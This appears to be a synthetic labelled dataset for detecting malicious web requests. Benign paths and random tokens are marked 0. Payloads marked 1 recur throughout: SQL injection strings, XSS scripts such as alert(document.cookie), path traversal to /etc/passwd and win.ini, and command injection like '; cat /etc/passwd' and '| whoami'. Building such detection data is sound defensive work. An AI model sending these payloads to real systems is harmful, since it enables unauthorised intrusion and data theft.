' OR 2=5 --,1
' OR 1=1 --,1
cart,0
index,0
user,0
<script>var a=342;alert(a)</script>,1
../../../windows/win.ini,1
' OR 7=3 --,1
dashboard,0
admin' --,1
/contact?id=3386,0
contact,0
/blog?id=8479,0
us2qJ5uJith,0
/checkout?session=12163,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?id=5048,0
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
/contact?id=9131,0
/login?session=48015,0
/home?session=36900,0
/dashboard?session=90277,0
../../../windows/win.ini,1
/dashboard?id=8550,0
/checkout?session=99209,0
' OR 1=2 --,1
; cat /etc/passwd,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
<script>var a=202;alert(a)</script>,1
<script>var a=700;alert(a)</script>,1
../../../../etc/passwd,1
/profile?session=92447,0
onerror=alert(1),1
H0hfQwamXmExk,0
; cat /etc/passwd,1
search,0
/contact?id=6196,0
onerror=alert(1),1
/index?id=2462,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
2N2oEK1Lg2Sr4,0
' OR '1'='1,1
' OR 6=3 --,1
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
' OR 9=8 --,1
/dashboard?session=18693,0
profile,0
' OR 3=3 --,1
' OR 4=7 --,1
/login?id=1556,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
<script>var a=209;alert(a)</script>,1
| whoami,1
/dashboard?session=97499,0
' OR 6=9 --,1
/contact?session=25262,0
/cart?session=26516,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
HvARUpJY3EQq,0
<script>var a=943;alert(a)</script>,1
index,0
/settings?session=23766,0
onerror=alert(1),1
/about?id=3561,0
about,0
q4ZJIkGf,0
/dashboard?session=70419,0
/profile?id=5505,0
<script>var a=351;alert(a)</script>,1
omdSyTMIRZTewiv,0
/checkout?session=93811,0
/blog?session=42453,0
<script>var a=162;alert(a)</script>,1
' OR 8=4 --,1
' OR 2=8 --,1
cart,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
<script>var a=513;alert(a)</script>,1
vd4UXdisyrQnH,0
search,0
<script>alert(document.cookie)</script>,1
/home?session=21889,0
' OR 8=7 --,1
' OR '1'='1,1
/dashboard?session=23027,0
<script>var a=411;alert(a)</script>,1
; cat /etc/passwd,1
/cart?session=64281,0
ud2UqSK8,0
/dashboard?session=69714,0
/checkout?session=54347,0
/contact?id=3801,0
/login?session=90494,0
/dashboard?id=9296,0
/settings?session=61703,0
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
onerror=alert(1),1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?id=611,0
B5ap7x9t,0
/profile?id=273,0
<script>var a=102;alert(a)</script>,1
79cpyD8LzsOyH,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
3tBTedl6,0
about,0
profile,0
/dashboard?session=29207,0
/checkout?id=7520,0
index,0
' OR '1'='1,1
s E l E c T * f R o M a d m i n,1
' OR 6=9 --,1
onerror=alert(1),1
7NOyCnasIjXyai,0
user,0
/about?session=84028,0
about,0
register,0
settings,0
javascript:alert(1),1
M2wHqL8uD1mYQY,0
/checkout?session=47693,0
/blog?id=6659,0
' OR 1=1 --,1
1' o r '1'='1,1
/login?session=42237,0
../../../windows/win.ini,1
' OR 1=5 --,1
/about?session=72880,0
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
dashboard,0
dksm7rVPJ,0
<script>var a=23;alert(a)</script>,1
' OR 8=1 --,1
../../../windows/win.ini,1
admin' --,1
admin' --,1
register,0
/profile?id=5467,0
/profile?session=50468,0
onerror=alert(1),1
<script>var a=296;alert(a)</script>,1
<script>var a=671;alert(a)</script>,1
AcxRMyeCwK6oJg,0
/blog?id=1428,0
1' o r '1'='1,1
../../../windows/win.ini,1
1' o r '1'='1,1
Bz5hXZDHO9a,0
/about?session=13476,0
admin' --,1
Spur8F30bzSGuX1,0
kYPIAZYm,0
s E l E c T * f R o M a d m i n,1
<script>var a=987;alert(a)</script>,1
8uUYOBUI10sLr,0
isMSlMzgc,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=602;alert(a)</script>,1
checkout,0
/index?id=4377,0
admin' --,1
s E l E c T * f R o M a d m i n,1
/blog?id=3654,0
/cart?id=4427,0
/contact?session=56824,0
' OR 7=9 --,1
' OR 7=4 --,1
login,0
' OR 8=4 --,1
/contact?session=61972,0
/settings?session=13586,0
' OR '1'='1,1
admin' --,1
admin' --,1
ArYWaEcI7X,0
/checkout?session=91798,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
/about?session=64186,0
onerror=alert(1),1
javascript:alert(1),1
onerror=alert(1),1
' OR '1'='1,1
s E l E c T * f R o M a d m i n,1
blog,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
xooGMMU8DuLJj,0
88RnBb5YNmjYl,0
index,0
| whoami,1
3tbQOTQ86Dt,0
<script>var a=716;alert(a)</script>,1
/contact?session=37195,0
; cat /etc/passwd,1
<script>var a=648;alert(a)</script>,1
/cart?id=8826,0
/dashboard?session=87146,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
Pf0XvWwkJCJ,0
/settings?id=7692,0
onerror=alert(1),1
' OR '1'='1,1
<script>var a=177;alert(a)</script>,1
1CWcOkaeqFHB3,0
' OR 1=1 --,1
profile,0
user,0
admin' --,1
s E l E c T * f R o M a d m i n,1
' OR 5=8 --,1
<script>var a=472;alert(a)</script>,1
cart,0
<script>alert(document.cookie)</script>,1
/home?id=9218,0
' OR 3=2 --,1
contact,0
' OR '1'='1,1
javascript:alert(1),1
brmpVlg8j8Vloi,0
' OR 3=3 --,1
onerror=alert(1),1
/profile?session=28449,0
/register?session=78474,0
admin%00' OR 1=1,1
C3wznWbDQTvL,0
admin'/* bypass */OR 1=1,1
vZGjhlrnp,0
<script>var a=213;alert(a)</script>,1
f5RJ8KOk7o,0
settings,0
NRAtKWKV2iyIUy,0
/login?id=5242,0
settings,0
Idqa8MrJ8NKBe,0
admin'/* bypass */OR 1=1,1
<script>var a=211;alert(a)</script>,1
../../../../etc/passwd,1
/cart?session=20369,0
dashboard,0
/register?id=1676,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?id=7292,0
' OR 8=1 --,1
admin%00' OR 1=1,1
user,0
/checkout?id=1653,0
admin'/* bypass */OR 1=1,1
/contact?id=8892,0
/register?id=330,0
dashboard,0
/profile?session=21092,0
u6HTF3LZY,0
ILIlKBacx,0
/login?id=6891,0
qaWcS8LLH4OLT,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
| whoami,1
checkout,0
nvq2C36Ie0rpW,0
| whoami,1
checkout,0
' OR 3=5 --,1
/register?session=35730,0
/contact?id=2434,0
admin' --,1
dashboard,0
/blog?id=8822,0
cart,0
' OR 1=1 --,1
/cart?id=4473,0
../../../../etc/passwd,1
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
register,0
| whoami,1
/profile?session=54485,0
GsuZSsyWkhFxAt,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=546;alert(a)</script>,1
<script>var a=576;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
onerror=alert(1),1
cbRbVAWaD0,0
KK7a2B6WfzP,0
<script>var a=448;alert(a)</script>,1
; cat /etc/passwd,1
/about?session=92952,0
' OR 7=2 --,1
../../../../etc/passwd,1
/dashboard?id=7361,0
profile,0
/cart?session=80681,0
<script>var a=643;alert(a)</script>,1
/register?id=5743,0
' OR '1'='1,1
CClZtW1GXg1,0
/register?session=69159,0
1' o r '1'='1,1
/cart?id=8908,0
/settings?id=1802,0
/profile?id=3591,0
<script>var a=674;alert(a)</script>,1
cart,0
../../../../etc/passwd,1
<script>var a=50;alert(a)</script>,1
admin%00' OR 1=1,1
1' o r '1'='1,1
home,0
' OR 9=1 --,1
/register?id=3505,0
search,0
onerror=alert(1),1
cDbrtjYzO,0
<script>var a=521;alert(a)</script>,1
/about?id=6533,0
/blog?id=9579,0
' OR 3=5 --,1
../../../windows/win.ini,1
dashboard,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?id=8930,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 5=9 --,1
<script>var a=912;alert(a)</script>,1
QDXJSlNF6,0
<script>var a=640;alert(a)</script>,1
/login?id=7270,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
TJYwJxqUEM,0
admin'/* bypass */OR 1=1,1
/profile?id=2945,0
; cat /etc/passwd,1
/contact?session=37456,0
/profile?id=2325,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=88456,0
<script>var a=761;alert(a)</script>,1
/contact?id=7195,0
' OR 2=4 --,1
/search?session=85340,0
<script>var a=891;alert(a)</script>,1
<script>var a=629;alert(a)</script>,1
' OR 6=5 --,1
<script>var a=828;alert(a)</script>,1
gCHk1iyN1,0
register,0
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
home,0
about,0
' OR 3=3 --,1
home,0
/contact?id=2692,0
' OR 1=1 --,1
/settings?session=34301,0
wmXZ085dRb,0
WALAUfSSSDw,0
rmSaTpqhq,0
' OR '1'='1,1
/settings?session=23404,0
' OR 1=4 --,1
blog,0
<script>var a=999;alert(a)</script>,1
home,0
<script>var a=338;alert(a)</script>,1
cart,0
/dashboard?id=9443,0
onerror=alert(1),1
| whoami,1
DziltRmd3,0
/home?id=93,0
admin'/* bypass */OR 1=1,1
/register?session=66486,0
6AX39lxcwW,0
; cat /etc/passwd,1
' OR 3=1 --,1
/home?id=4968,0
javascript:alert(1),1
settings,0
1' o r '1'='1,1
/about?session=80960,0
/user?id=5940,0
/register?session=89086,0
/contact?id=3925,0
nRMIwGHmBOGjI,0
/dashboard?id=6290,0
/dashboard?id=1293,0
<script>var a=963;alert(a)</script>,1
/contact?id=2156,0
/profile?id=3762,0
cart,0
profile,0
s E l E c T * f R o M a d m i n,1
/login?session=12322,0
/index?session=62526,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
/profile?id=2467,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?session=82648,0
register,0
dashboard,0
/profile?session=24405,0
' OR '1'='1,1
| whoami,1
<script>var a=737;alert(a)</script>,1
7UM9VcJQwkp,0
; cat /etc/passwd,1
register,0
<script>var a=814;alert(a)</script>,1
cart,0
/blog?id=1795,0
' OR 4=4 --,1
/profile?session=45025,0
AfBZseWmGMDJ,0
' OR 1=3 --,1
s E l E c T * f R o M a d m i n,1
IKfIy0BlWi,0
1' o r '1'='1,1
blog,0
' OR 1=1 --,1
<script>var a=40;alert(a)</script>,1
' OR '1'='1,1
/checkout?session=78565,0
<script>var a=64;alert(a)</script>,1
/dashboard?id=7230,0
' OR 3=2 --,1
/user?session=34880,0
seSWXY25B,0
1' o r '1'='1,1
1' o r '1'='1,1
/profile?session=57382,0
jLTbytw18,0
/register?id=7446,0
' OR 8=4 --,1
/about?session=64300,0
/contact?session=31614,0
admin%00' OR 1=1,1
about,0
<script>var a=966;alert(a)</script>,1
contact,0
<script>var a=936;alert(a)</script>,1
/cart?session=50920,0
' OR '1'='1,1
admin%00' OR 1=1,1
' OR 7=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=24697,0
/checkout?id=7655,0
settings,0
/search?session=78268,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?session=41584,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=595;alert(a)</script>,1
VDiCKzn8,0
' OR 9=8 --,1
4aq2LmQEtRMsssD,0
s E l E c T * f R o M a d m i n,1
/login?session=18609,0
/search?id=9362,0
<script>var a=30;alert(a)</script>,1
admin' --,1
vSrzoGdmpp5h,0
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
' OR 2=4 --,1
../../../../etc/passwd,1
PQiwSO90,0
' OR 4=1 --,1
L5BrLwAmlCmRnA3,0
blog,0
<script>var a=623;alert(a)</script>,1
; cat /etc/passwd,1
/register?id=2215,0
../../../../etc/passwd,1
cart,0
admin%00' OR 1=1,1
' OR 1=4 --,1
oyWMID4zhrGDI,0
' OR 1=1 --,1
7VBlCCOeXPyHv7d,0
register,0
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?id=1597,0
; cat /etc/passwd,1
about,0
1' o r '1'='1,1
' OR 4=3 --,1
/checkout?id=711,0
<script>var a=734;alert(a)</script>,1
/checkout?session=85586,0
<script>var a=289;alert(a)</script>,1
/dashboard?session=71208,0
o21WHzwhk,0
/search?session=11848,0
<script>var a=513;alert(a)</script>,1
admin%00' OR 1=1,1
gjI9nmmY,0
/register?id=7487,0
/home?session=94501,0
' OR 9=7 --,1
/home?id=1220,0
| whoami,1
/login?session=24983,0
/index?session=15700,0
PPudSIOfJrS,0
ZstYXRiqiQKg,0
pGGQXT9Hh8,0
../../../../etc/passwd,1
/search?session=61428,0
PeybmC8og9,0
/profile?id=9494,0
/cart?session=45140,0
<script>var a=731;alert(a)</script>,1
rdRjFpmJ,0
admin%00' OR 1=1,1
' OR 7=8 --,1
index,0
admin%00' OR 1=1,1
0WWRVAIOugnZVAh,0
/register?id=4879,0
javascript:alert(1),1
jpiOIhIASI4q,0
s E l E c T * f R o M a d m i n,1
r1WwvSBtP,0
/blog?id=8519,0
cart,0
home,0
/blog?id=7694,0
' OR '1'='1,1
<script>var a=998;alert(a)</script>,1
/search?session=66631,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?id=8991,0
onerror=alert(1),1
admin%00' OR 1=1,1
/home?session=55168,0
ybRnvjUk1MU39Q,0
../../../../etc/passwd,1
/blog?id=7721,0
index,0
pJnOuYj6,0
' OR 6=2 --,1
/user?id=9194,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
' OR 2=9 --,1
/checkout?id=9134,0
<script>var a=816;alert(a)</script>,1
search,0
<script>var a=809;alert(a)</script>,1
; cat /etc/passwd,1
<script>var a=56;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
<script>var a=15;alert(a)</script>,1
1' o r '1'='1,1
' OR 1=9 --,1
' OR 6=2 --,1
; cat /etc/passwd,1
dashboard,0
/contact?id=3471,0
admin'/* bypass */OR 1=1,1
dashboard,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/contact?id=4768,0
<script>var a=683;alert(a)</script>,1
dashboard,0
1' o r '1'='1,1
WUyquj6YTv1k,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
search,0
| whoami,1
Gyr7jKrYxPlX,0
/search?id=5802,0
/login?id=317,0
about,0
/contact?session=51627,0
/about?session=67604,0
admin'/* bypass */OR 1=1,1
login,0
NIMc0bx1nZ9,0
onerror=alert(1),1
../../../../etc/passwd,1
1' o r '1'='1,1
home,0
/blog?session=33165,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=8 --,1
/search?session=15089,0
aiSyZp5qLaUe,0
1' o r '1'='1,1
peKM7YJMOeZz,0
s E l E c T * f R o M a d m i n,1
XCOCRFSVkJvkUkl,0
blog,0
<script>var a=509;alert(a)</script>,1
profile,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=2262,0
' OR 2=1 --,1
/user?session=10621,0
admin' --,1
<script>var a=702;alert(a)</script>,1
<script>var a=10;alert(a)</script>,1
/user?session=15586,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=5 --,1
/about?session=26196,0
../../../../etc/passwd,1
<script>var a=244;alert(a)</script>,1
<script>var a=522;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=900;alert(a)</script>,1
/cart?session=88418,0
' OR 3=3 --,1
profile,0
/settings?session=38549,0
' OR 9=7 --,1
login,0
' OR '1'='1,1
' OR 6=8 --,1
' OR 9=2 --,1
/settings?session=52486,0
1CQhCrLdnkQ9V,0
/register?id=4892,0
/contact?id=9674,0
blog,0
' OR 9=8 --,1
/user?session=98262,0
dashboard,0
/dashboard?session=94342,0
; cat /etc/passwd,1
' OR 1=1 --,1
/home?id=7448,0
/search?session=56523,0
| whoami,1
/user?id=7077,0
3nJr0wDVaaVByJ4,0
<script>var a=593;alert(a)</script>,1
' OR 4=2 --,1
<script>var a=262;alert(a)</script>,1
<script>var a=652;alert(a)</script>,1
<script>var a=879;alert(a)</script>,1
/home?session=12824,0
fAx14rhBsim,0
' OR 1=5 --,1
VhrLEB1uh,0
/login?id=6346,0
<script>var a=31;alert(a)</script>,1
/contact?id=745,0
; cat /etc/passwd,1
/login?session=57479,0
<script>var a=228;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
UBbsNR53dj,0
<script>var a=710;alert(a)</script>,1
/settings?session=28855,0
ai3UvzAe0,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 8=1 --,1
/home?id=7376,0
/search?session=25055,0
../../../../etc/passwd,1
/about?session=62414,0
' OR 1=1 --,1
' OR 9=5 --,1
BL3o3oak,0
' OR 9=5 --,1
jmcirY4BH8r,0
/contact?id=4838,0
/register?id=5151,0
admin' --,1
/search?id=9570,0
/contact?session=19588,0
/profile?id=702,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=9 --,1
1' o r '1'='1,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
register,0
/settings?id=8708,0
/settings?session=87712,0
<script>var a=269;alert(a)</script>,1
/about?session=14782,0
' OR 4=5 --,1
admin' --,1
admin%00' OR 1=1,1
admin' --,1
' OR '1'='1,1
/dashboard?id=5203,0
settings,0
<script>alert(document.cookie)</script>,1
contact,0
../../../windows/win.ini,1
' OR 9=1 --,1
<script>var a=857;alert(a)</script>,1
' OR '1'='1,1
register,0
<script>var a=712;alert(a)</script>,1
fCCm05F0JPOsR,0
' OR 3=2 --,1
/login?session=64697,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
blog,0
AndEa9xybXUIlq,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
/register?id=8140,0
' OR '1'='1,1
nhxQKEBhazeAJK,0
/search?id=6589,0
/about?id=4204,0
<script>alert(document.cookie)</script>,1
1e9djKB5lFBNZ,0
search,0
1' o r '1'='1,1
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
/register?session=40217,0
/cart?id=3092,0
admin%00' OR 1=1,1
<script>var a=697;alert(a)</script>,1
/about?session=82453,0
admin'/* bypass */OR 1=1,1
<script>var a=448;alert(a)</script>,1
cart,0
/blog?session=12455,0
admin%00' OR 1=1,1
/register?session=46333,0
AQ5V9jK0oe,0
T5V1GwFSi,0
../../../../etc/passwd,1
<script>var a=137;alert(a)</script>,1
dashboard,0
/register?session=77357,0
user,0
../../../windows/win.ini,1
search,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
user,0
<script>var a=47;alert(a)</script>,1
/about?session=96239,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
/about?id=2246,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
/blog?session=56419,0
JXDtFXjxjkpbM,0
/login?id=2095,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
' OR 9=7 --,1
5xSU8jp8,0
x9bEzJHCs,0
/home?id=6367,0
' OR 8=1 --,1
YoaUwKrOb3a0,0
s E l E c T * f R o M a d m i n,1
<script>var a=440;alert(a)</script>,1
admin' --,1
/contact?session=78776,0
admin' --,1
/about?id=3784,0
blog,0
pNnuENOe,0
blog,0
sZjRrykbU,0
; cat /etc/passwd,1
<script>var a=372;alert(a)</script>,1
<script>var a=913;alert(a)</script>,1
KjlcI4irp,0
' OR 2=2 --,1
| whoami,1
' OR 1=1 --,1
../../../windows/win.ini,1
javascript:alert(1),1
' OR 3=2 --,1
' OR 1=7 --,1
/home?id=3189,0
' OR '1'='1,1
DsZalFk6BqH,0
cart,0
/profile?id=2956,0
uRpg4tuIQy9,0
wJY95xoSbvA8k,0
/dashboard?id=9797,0
javascript:alert(1),1
PeJMUFgObmcJR,0
IuRpz09xQ4Yw8gr,0
1' o r '1'='1,1
<script>var a=186;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/about?session=29894,0
blog,0
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=933;alert(a)</script>,1
settings,0
../../../windows/win.ini,1
../../../windows/win.ini,1
1' o r '1'='1,1
<script>var a=809;alert(a)</script>,1
/contact?session=61999,0
/login?session=31958,0
' OR 7=2 --,1
/index?session=86729,0
register,0
' OR '1'='1,1
admin%00' OR 1=1,1
<script>var a=875;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
HwBNsaU02SHs,0
admin'/* bypass */OR 1=1,1
/search?id=584,0
' OR '1'='1,1
javascript:alert(1),1
<script>var a=944;alert(a)</script>,1
settings,0
LG5Ss8whNtBo,0
/checkout?id=6953,0
<script>var a=720;alert(a)</script>,1
<script>var a=24;alert(a)</script>,1
/dashboard?session=37879,0
/profile?id=2290,0
' OR 2=8 --,1
admin%00' OR 1=1,1
/dashboard?session=67137,0
<script>var a=395;alert(a)</script>,1
ZvjWBg5T3,0
' OR 4=1 --,1
/home?session=93351,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?id=1529,0
/checkout?session=65853,0
register,0
index,0
contact,0
' OR 3=9 --,1
/home?id=5089,0
/index?session=58265,0
<script>alert(document.cookie)</script>,1
settings,0
' OR 1=1 --,1
<script>var a=912;alert(a)</script>,1
/register?id=3806,0
../../../../etc/passwd,1
/about?session=39837,0
/dashboard?id=4661,0
/checkout?id=6571,0
' OR 5=7 --,1
<script>var a=762;alert(a)</script>,1
/about?session=68344,0
/settings?id=614,0
/blog?session=89950,0
/cart?session=24153,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
JXxGE2DNrs,0
' OR 9=7 --,1
qKpXoMg09kL,0
' OR 2=3 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
/profile?id=7562,0
/login?id=8020,0
/contact?session=27177,0
' OR 1=6 --,1
../../../../etc/passwd,1
UKeHjWZc4NyFnAJ,0
' OR '1'='1,1
' OR 3=2 --,1
ICNdY7pcpsY,0
/profile?id=162,0
onerror=alert(1),1
../../../../etc/passwd,1
QosDgqI0tqCCvwU,0
<script>var a=228;alert(a)</script>,1
ZxnaDId48Tn,0
admin' --,1
<script>var a=544;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
J2SoEsy6Trf,0
cart,0
../../../windows/win.ini,1
' OR '1'='1,1
EI7PObYQ2,0
<script>var a=926;alert(a)</script>,1
' OR '1'='1,1
' OR 3=5 --,1
EQAZ6oXjZFD,0
TFUOMTl0MrybMW,0
' OR 2=2 --,1
onerror=alert(1),1
/search?id=8346,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
register,0
/login?session=75521,0
admin'/* bypass */OR 1=1,1
<script>var a=941;alert(a)</script>,1
/contact?id=3658,0
/cart?session=54303,0
/about?session=39227,0
<script>var a=709;alert(a)</script>,1
<script>var a=428;alert(a)</script>,1
/profile?id=6571,0
' OR 8=6 --,1
cart,0
WZAdhefJ,0
<script>var a=472;alert(a)</script>,1
RsnvjoolnGPBg,0
/about?session=72659,0
<script>var a=296;alert(a)</script>,1
' OR 4=4 --,1
/login?id=2427,0
XcC6dGcGoksIe,0
COxycwQ9F,0
javascript:alert(1),1
/search?id=4401,0
search,0
admin%00' OR 1=1,1
/user?id=1872,0
/register?session=87450,0
onerror=alert(1),1
/cart?session=84658,0
onerror=alert(1),1
../../../windows/win.ini,1
' OR 7=2 --,1
' OR 1=9 --,1
' OR 6=2 --,1
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
/contact?session=86944,0
kCUcsuceCPuJa,0
admin%00' OR 1=1,1
/blog?id=5849,0
/dashboard?session=34814,0
JFDHuh2Fv,0
/cart?session=32205,0
' OR 1=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=788;alert(a)</script>,1
user,0
i6txaumGq,0
dashboard,0
kAE9uwtALRiJmV,0
index,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
/checkout?session=28493,0
| whoami,1
/login?session=16840,0
<script>var a=451;alert(a)</script>,1
<script>var a=163;alert(a)</script>,1
../../../../etc/passwd,1
/home?id=7440,0
; cat /etc/passwd,1
Q9OXARWPW,0
index,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
54P9eiMNta,0
4RRoVcOvjw,0
/home?session=20895,0
mnE0SCthvhi6,0
index,0
' OR 9=4 --,1
onerror=alert(1),1
' OR 7=1 --,1
/dashboard?id=8869,0
s E l E c T * f R o M a d m i n,1
<script>var a=853;alert(a)</script>,1
/blog?session=38074,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
/search?session=79991,0
GmP3fpTys,0
/search?session=33032,0
| whoami,1
blog,0
' OR 1=6 --,1
' OR 2=6 --,1
<script>alert(document.cookie)</script>,1
checkout,0
| whoami,1
' OR 8=6 --,1
s E l E c T * f R o M a d m i n,1
wgX3HFBx,0
contact,0
QV6WiCr1r,0
<script>var a=868;alert(a)</script>,1
blog,0
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
' OR 5=1 --,1
../../../windows/win.ini,1
' OR '1'='1,1
| whoami,1
vZknAjuK2WTZPX,0
j9qimJ7g,0
login,0
DpSL2kPXgFQtXZP,0
/dashboard?session=18758,0
; cat /etc/passwd,1
onerror=alert(1),1
jyyQP8SIaUVVMQM,0
/profile?session=83368,0
<script>alert(document.cookie)</script>,1
/contact?session=77012,0
' OR 1=3 --,1
/about?session=52084,0
; cat /etc/passwd,1
onerror=alert(1),1
<script>var a=109;alert(a)</script>,1
' OR 5=2 --,1
<script>var a=248;alert(a)</script>,1
' OR 1=1 --,1
' OR 5=8 --,1
/cart?id=7893,0
' OR 1=1 --,1
' OR '1'='1,1
/login?session=30166,0
login,0
/home?session=29102,0
' OR 5=4 --,1
cart,0
javascript:alert(1),1
/index?session=16586,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=66844,0
<script>var a=212;alert(a)</script>,1
<script>var a=227;alert(a)</script>,1
cWA5HdiTS2XyAYL,0
/checkout?id=2732,0
rG85kIMQzlEP2DB,0
/blog?session=94020,0
jD0tnauV1NHWIcZ,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
dashboard,0
/contact?session=67988,0
settings,0
<script>var a=170;alert(a)</script>,1
kuOL0GxaqZRq,0
s E l E c T * f R o M a d m i n,1
/login?id=1490,0
' OR 4=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?session=84488,0
' OR 6=2 --,1
s E l E c T * f R o M a d m i n,1
/login?session=79706,0
<script>alert(document.cookie)</script>,1
search,0
admin' --,1
dashboard,0
; cat /etc/passwd,1
lzVsMyC3ZmYI81z,0
checkout,0
<script>var a=272;alert(a)</script>,1
../../../windows/win.ini,1
/cart?session=55647,0
1' o r '1'='1,1
/cart?session=64426,0
mgVUucThJ,0
<script>alert(document.cookie)</script>,1
search,0
1' o r '1'='1,1
admin' --,1
' OR 1=4 --,1
/about?session=42148,0
OXd9emvVwutKxy,0
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
' OR 1=1 --,1
/user?session=35890,0
/search?id=4762,0
' OR 2=6 --,1
' OR 9=4 --,1
' OR 5=9 --,1
about,0
dashboard,0
dashboard,0
<script>var a=370;alert(a)</script>,1
<script>var a=457;alert(a)</script>,1
<script>var a=450;alert(a)</script>,1
' OR 2=5 --,1
fpRT6wVer,0
<script>var a=310;alert(a)</script>,1
/index?id=4709,0
/home?session=44656,0
<script>var a=365;alert(a)</script>,1
/contact?id=3658,0
/dashboard?session=99142,0
/cart?id=6989,0
' OR '1'='1,1
ZPgxHM2Jrl,0
1' o r '1'='1,1
javascript:alert(1),1
/blog?session=10177,0
/settings?id=5697,0
| whoami,1
/index?session=50233,0
<script>var a=476;alert(a)</script>,1
/contact?id=6932,0
admin' --,1
' OR 6=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=8024,0
dashboard,0
index,0
<script>var a=862;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=565;alert(a)</script>,1
K9SqaEgPu,0
' OR 1=1 --,1
<script>var a=689;alert(a)</script>,1
ZOLxFSDPKhrXNy,0
/profile?session=12815,0
admin'/* bypass */OR 1=1,1
' OR 3=1 --,1
<script>var a=1;alert(a)</script>,1
' OR 1=3 --,1
/user?id=2633,0
../../../../etc/passwd,1
8iEZclmYHyJWKI,0
' OR 7=6 --,1
| whoami,1
admin%00' OR 1=1,1
0qkzhZtW,0
/user?id=1457,0
; cat /etc/passwd,1
home,0
../../../../etc/passwd,1
